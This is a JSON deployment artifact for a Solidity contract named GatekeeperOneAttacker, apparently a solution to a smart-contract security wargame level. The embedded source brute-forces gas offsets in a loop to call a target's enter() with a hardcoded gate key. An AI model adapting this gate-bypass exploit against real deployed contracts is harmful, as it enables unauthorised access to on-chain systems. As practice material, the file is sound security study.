{
  "address": "0x97BF242089Cc30C8Af524e4d4ffeEE6aE52C1334",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_initialOwner",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "owner",
          "type": "address"
        }
      ],
      "name": "OwnableInvalidOwner",
      "type": "error"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "account",
          "type": "address"
        }
      ],
      "name": "OwnableUnauthorizedAccount",
      "type": "error"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "previousOwner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "OwnershipTransferred",
      "type": "event"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "gateKey",
      "outputs": [
        {
          "internalType": "bytes8",
          "name": "",
          "type": "bytes8"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "renounceOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_target",
          "type": "address"
        }
      ],
      "name": "setAttack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "bytes8",
          "name": "_key",
          "type": "bytes8"
        }
      ],
      "name": "setGateKey",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "targetContract",
      "outputs": [
        {
          "internalType": "contract IGateKeeper",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "transferOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "transactionHash": "0x1c10a4035b53237f0ad326c621e03583b9d681f1033780b2342c2c4552b8d562",
  "receipt": {
    "to": null,
    "from": "0xcC6eDeB501BbD8AD9E028BDe937B63Cdd64A1D91",
    "contractAddress": "0x97BF242089Cc30C8Af524e4d4ffeEE6aE52C1334",
    "transactionIndex": 194,
    "gasUsed": "352691",
    "logsBloom": "0x00000000000000000000000000000000000000000000000000800000000000000000000000000000000000000200000000000000000000000000000000000000000000100000000000000000000000000001000000000000000000000000000000000000020000000200000000000810000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000080000000000000000000000000000000",
    "blockHash": "0x059e92b6039f7b76da24e0f14df5ce30e77c1310bba656a7427506464a3a4a09",
    "transactionHash": "0x1c10a4035b53237f0ad326c621e03583b9d681f1033780b2342c2c4552b8d562",
    "logs": [
      {
        "transactionIndex": 194,
        "blockNumber": 8170309,
        "transactionHash": "0x1c10a4035b53237f0ad326c621e03583b9d681f1033780b2342c2c4552b8d562",
        "address": "0x97BF242089Cc30C8Af524e4d4ffeEE6aE52C1334",
        "topics": [
          "0x8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0",
          "0x0000000000000000000000000000000000000000000000000000000000000000",
          "0x000000000000000000000000cc6edeb501bbd8ad9e028bde937b63cdd64a1d91"
        ],
        "data": "0x",
        "logIndex": 342,
        "blockHash": "0x059e92b6039f7b76da24e0f14df5ce30e77c1310bba656a7427506464a3a4a09"
      }
    ],
    "blockNumber": 8170309,
    "cumulativeGasUsed": "18959466",
    "status": 1,
    "byzantium": true
  },
  "args": [
    "0xcC6eDeB501BbD8AD9E028BDe937B63Cdd64A1D91"
  ],
  "numDeployments": 1,
  "solcInputHash": "60c35fbdfe8516fa349721f5e6a8f480",
  "metadata": "{\"compiler\":{\"version\":\"0.8.20+commit.a1b79de6\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_initialOwner\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"OwnableInvalidOwner\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"OwnableUnauthorizedAccount\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"attack\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"gateKey\",\"outputs\":[{\"internalType\":\"bytes8\",\"name\":\"\",\"type\":\"bytes8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_target\",\"type\":\"address\"}],\"name\":\"setAttack\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bytes8\",\"name\":\"_key\",\"type\":\"bytes8\"}],\"name\":\"setGateKey\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"targetContract\",\"outputs\":[{\"internalType\":\"contract IGateKeeper\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"errors\":{\"OwnableInvalidOwner(address)\":[{\"details\":\"The owner is not a valid owner account. (eg. `address(0)`)\"}],\"OwnableUnauthorizedAccount(address)\":[{\"details\":\"The caller account is not authorized to perform an operation.\"}]},\"kind\":\"dev\",\"methods\":{\"owner()\":{\"details\":\"Returns the address of the current owner.\"},\"renounceOwnership()\":{\"details\":\"Leaves the contract without owner. It will not be possible to call `onlyOwner` functions. Can only be called by the current owner. NOTE: Renouncing ownership will leave the contract without an owner, thereby disabling any functionality that is only available to the owner.\"},\"transferOwnership(address)\":{\"details\":\"Transfers ownership of the contract to a new account (`newOwner`). Can only be called by the current owner.\"}},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/GateKeeperOneAttacker.sol\":\"GatekeeperOneAttacker\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/access/Ownable.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (access/Ownable.sol)\\n\\npragma solidity ^0.8.20;\\n\\nimport {Context} from \\\"../utils/Context.sol\\\";\\n\\n/**\\n * @dev Contract module which provides a basic access control mechanism, where\\n * there is an account (an owner) that can be granted exclusive access to\\n * specific functions.\\n *\\n * The initial owner is set to the address provided by the deployer. This can\\n * later be changed with {transferOwnership}.\\n *\\n * This module is used through inheritance. It will make available the modifier\\n * `onlyOwner`, which can be applied to your functions to restrict their use to\\n * the owner.\\n */\\nabstract contract Ownable is Context {\\n    address private _owner;\\n\\n    /**\\n     * @dev The caller account is not authorized to perform an operation.\\n     */\\n    error OwnableUnauthorizedAccount(address account);\\n\\n    /**\\n     * @dev The owner is not a valid owner account. (eg. `address(0)`)\\n     */\\n    error OwnableInvalidOwner(address owner);\\n\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\n\\n    /**\\n     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.\\n     */\\n    constructor(address initialOwner) {\\n        if (initialOwner == address(0)) {\\n            revert OwnableInvalidOwner(address(0));\\n        }\\n        _transferOwnership(initialOwner);\\n    }\\n\\n    /**\\n     * @dev Throws if called by any account other than the owner.\\n     */\\n    modifier onlyOwner() {\\n        _checkOwner();\\n        _;\\n    }\\n\\n    /**\\n     * @dev Returns the address of the current owner.\\n     */\\n    function owner() public view virtual returns (address) {\\n        return _owner;\\n    }\\n\\n    /**\\n     * @dev Throws if the sender is not the owner.\\n     */\\n    function _checkOwner() internal view virtual {\\n        if (owner() != _msgSender()) {\\n            revert OwnableUnauthorizedAccount(_msgSender());\\n        }\\n    }\\n\\n    /**\\n     * @dev Leaves the contract without owner. It will not be possible to call\\n     * `onlyOwner` functions. Can only be called by the current owner.\\n     *\\n     * NOTE: Renouncing ownership will leave the contract without an owner,\\n     * thereby disabling any functionality that is only available to the owner.\\n     */\\n    function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Can only be called by the current owner.\\n     */\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\n        if (newOwner == address(0)) {\\n            revert OwnableInvalidOwner(address(0));\\n        }\\n        _transferOwnership(newOwner);\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Internal function without access restriction.\\n     */\\n    function _transferOwnership(address newOwner) internal virtual {\\n        address oldOwner = _owner;\\n        _owner = newOwner;\\n        emit OwnershipTransferred(oldOwner, newOwner);\\n    }\\n}\\n\",\"keccak256\":\"0xff6d0bb2e285473e5311d9d3caacb525ae3538a80758c10649a4d61029b017bb\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/Context.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.1) (utils/Context.sol)\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Provides information about the current execution context, including the\\n * sender of the transaction and its data. While these are generally available\\n * via msg.sender and msg.data, they should not be accessed in such a direct\\n * manner, since when dealing with meta-transactions the account sending and\\n * paying for execution may not be the actual sender (as far as an application\\n * is concerned).\\n *\\n * This contract is only required for intermediate, library-like contracts.\\n */\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n\\n    function _contextSuffixLength() internal view virtual returns (uint256) {\\n        return 0;\\n    }\\n}\\n\",\"keccak256\":\"0x493033a8d1b176a037b2cc6a04dad01a5c157722049bbecf632ca876224dd4b2\",\"license\":\"MIT\"},\"contracts/GateKeeperOneAttacker.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\nimport \\\"@openzeppelin/contracts/access/Ownable.sol\\\";\\n\\ninterface IGateKeeper {\\n    function enter(bytes8 _gateKey) external returns (bool);\\n}\\n\\ncontract GatekeeperOneAttacker is Ownable{\\n    IGateKeeper public targetContract;\\n\\n    bytes8 public gateKey = 0x100000000000a1d1;\\n\\n    constructor(address _initialOwner) Ownable(_initialOwner) {\\n\\n    }\\n\\n    function setAttack(address _target) public onlyOwner{\\n        targetContract = IGateKeeper(_target);\\n    }\\n\\n    function setGateKey(bytes8 _key) public onlyOwner {\\n        gateKey = _key;\\n    }\\n\\n    function attack() public onlyOwner returns (bool){\\n        for (uint256 i = 0; i < 300; i++) {\\n        try targetContract.enter{gas: 8191 * 10 + i}(gateKey) returns (bool result) {\\n            return result;\\n        } catch {}\\n        }\\n        revert(\\\"All attempts failed\\\");\\n    }\\n}\",\"keccak256\":\"0xc57a5079305185d51d0dc26c7902f4a39098e332065ee50e6b125214566ff58f\",\"license\":\"MIT\"}},\"version\":1}",
  "bytecode": "0x608060405260018054600160a01b600160e01b0319167b100000000000a1d1000000000000000000000000000000000000000017905534801561004157600080fd5b506040516105af3803806105af833981016040819052610060916100ef565b806001600160a01b03811661008f57604051631e4fbdf760e01b81526000600482015260240160405180910390fd5b6100988161009f565b505061011f565b600080546001600160a01b038381166001600160a01b0319831681178455604051919092169283917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e09190a35050565b60006020828403121561010157600080fd5b81516001600160a01b038116811461011857600080fd5b9392505050565b6104818061012e6000396000f3fe608060405234801561001057600080fd5b50600436106100885760003560e01c80639e5faafc1161005b5780639e5faafc146100e7578063bb1ad687146100ff578063bd90df701461012c578063f2fde38b1461013f57600080fd5b8063715018a61461008d578063730a694e14610097578063741690e2146100aa5780638da5cb5b146100bd575b600080fd5b610095610152565b005b6100956100a5366004610387565b610166565b6100956100b83660046103b8565b610196565b6000546001600160a01b03165b6040516001600160a01b0390911681526020015b60405180910390f35b6100ef6101c0565b60405190151581526020016100de565b60015461011390600160a01b900460c01b81565b6040516001600160c01b031990911681526020016100de565b6001546100ca906001600160a01b031681565b61009561014d3660046103b8565b6102cc565b61015a61030a565b6101646000610337565b565b61016e61030a565b6001805460c09290921c600160a01b0267ffffffffffffffff60a01b19909216919091179055565b61019e61030a565b600180546001600160a01b0319166001600160a01b0392909216919091179055565b60006101ca61030a565b60005b61012c811015610285576001546001600160a01b0316633370204e6101f58362013ff66103f7565b6001546040516001600160e01b031960e085901b168152600160a01b90910460c01b6001600160c01b031916600482015260240160206040518083038160008887f193505050508015610265575060408051601f3d908101601f1916820190925261026291810190610410565b60015b156102735791506102c99050565b8061027d81610432565b9150506101cd565b5060405162461bcd60e51b8152602060048201526013602482015272105b1b08185d1d195b5c1d1cc819985a5b1959606a1b60448201526064015b60405180910390fd5b90565b6102d461030a565b6001600160a01b0381166102fe57604051631e4fbdf760e01b8152600060048201526024016102c0565b61030781610337565b50565b6000546001600160a01b031633146101645760405163118cdaa760e01b81523360048201526024016102c0565b600080546001600160a01b038381166001600160a01b0319831681178455604051919092169283917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e09190a35050565b60006020828403121561039957600080fd5b81356001600160c01b0319811681146103b157600080fd5b9392505050565b6000602082840312156103ca57600080fd5b81356001600160a01b03811681146103b157600080fd5b634e487b7160e01b600052601160045260246000fd5b8082018082111561040a5761040a6103e1565b92915050565b60006020828403121561042257600080fd5b815180151581146103b157600080fd5b600060018201610444576104446103e1565b506001019056fea2646970667358221220767fc45c0221d181caf91b6e7cfa14384bc4c1c0fc787985fe22302d90012cdd64736f6c63430008140033",
  "deployedBytecode": "0x608060405234801561001057600080fd5b50600436106100885760003560e01c80639e5faafc1161005b5780639e5faafc146100e7578063bb1ad687146100ff578063bd90df701461012c578063f2fde38b1461013f57600080fd5b8063715018a61461008d578063730a694e14610097578063741690e2146100aa5780638da5cb5b146100bd575b600080fd5b610095610152565b005b6100956100a5366004610387565b610166565b6100956100b83660046103b8565b610196565b6000546001600160a01b03165b6040516001600160a01b0390911681526020015b60405180910390f35b6100ef6101c0565b60405190151581526020016100de565b60015461011390600160a01b900460c01b81565b6040516001600160c01b031990911681526020016100de565b6001546100ca906001600160a01b031681565b61009561014d3660046103b8565b6102cc565b61015a61030a565b6101646000610337565b565b61016e61030a565b6001805460c09290921c600160a01b0267ffffffffffffffff60a01b19909216919091179055565b61019e61030a565b600180546001600160a01b0319166001600160a01b0392909216919091179055565b60006101ca61030a565b60005b61012c811015610285576001546001600160a01b0316633370204e6101f58362013ff66103f7565b6001546040516001600160e01b031960e085901b168152600160a01b90910460c01b6001600160c01b031916600482015260240160206040518083038160008887f193505050508015610265575060408051601f3d908101601f1916820190925261026291810190610410565b60015b156102735791506102c99050565b8061027d81610432565b9150506101cd565b5060405162461bcd60e51b8152602060048201526013602482015272105b1b08185d1d195b5c1d1cc819985a5b1959606a1b60448201526064015b60405180910390fd5b90565b6102d461030a565b6001600160a01b0381166102fe57604051631e4fbdf760e01b8152600060048201526024016102c0565b61030781610337565b50565b6000546001600160a01b031633146101645760405163118cdaa760e01b81523360048201526024016102c0565b600080546001600160a01b038381166001600160a01b0319831681178455604051919092169283917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e09190a35050565b60006020828403121561039957600080fd5b81356001600160c01b0319811681146103b157600080fd5b9392505050565b6000602082840312156103ca57600080fd5b81356001600160a01b03811681146103b157600080fd5b634e487b7160e01b600052601160045260246000fd5b8082018082111561040a5761040a6103e1565b92915050565b60006020828403121561042257600080fd5b815180151581146103b157600080fd5b600060018201610444576104446103e1565b506001019056fea2646970667358221220767fc45c0221d181caf91b6e7cfa14384bc4c1c0fc787985fe22302d90012cdd64736f6c63430008140033",
  "devdoc": {
    "errors": {
      "OwnableInvalidOwner(address)": [
        {
          "details": "The owner is not a valid owner account. (eg. `address(0)`)"
        }
      ],
      "OwnableUnauthorizedAccount(address)": [
        {
          "details": "The caller account is not authorized to perform an operation."
        }
      ]
    },
    "kind": "dev",
    "methods": {
      "owner()": {
        "details": "Returns the address of the current owner."
      },
      "renounceOwnership()": {
        "details": "Leaves the contract without owner. It will not be possible to call `onlyOwner` functions. Can only be called by the current owner. NOTE: Renouncing ownership will leave the contract without an owner, thereby disabling any functionality that is only available to the owner."
      },
      "transferOwnership(address)": {
        "details": "Transfers ownership of the contract to a new account (`newOwner`). Can only be called by the current owner."
      }
    },
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  },
  "storageLayout": {
    "storage": [
      {
        "astId": 8,
        "contract": "contracts/GateKeeperOneAttacker.sol:GatekeeperOneAttacker",
        "label": "_owner",
        "offset": 0,
        "slot": "0",
        "type": "t_address"
      },
      {
        "astId": 193,
        "contract": "contracts/GateKeeperOneAttacker.sol:GatekeeperOneAttacker",
        "label": "targetContract",
        "offset": 0,
        "slot": "1",
        "type": "t_contract(IGateKeeper)188"
      },
      {
        "astId": 196,
        "contract": "contracts/GateKeeperOneAttacker.sol:GatekeeperOneAttacker",
        "label": "gateKey",
        "offset": 20,
        "slot": "1",
        "type": "t_bytes8"
      }
    ],
    "types": {
      "t_address": {
        "encoding": "inplace",
        "label": "address",
        "numberOfBytes": "20"
      },
      "t_bytes8": {
        "encoding": "inplace",
        "label": "bytes8",
        "numberOfBytes": "8"
      },
      "t_contract(IGateKeeper)188": {
        "encoding": "inplace",
        "label": "contract IGateKeeper",
        "numberOfBytes": "20"
      }
    }
  }
}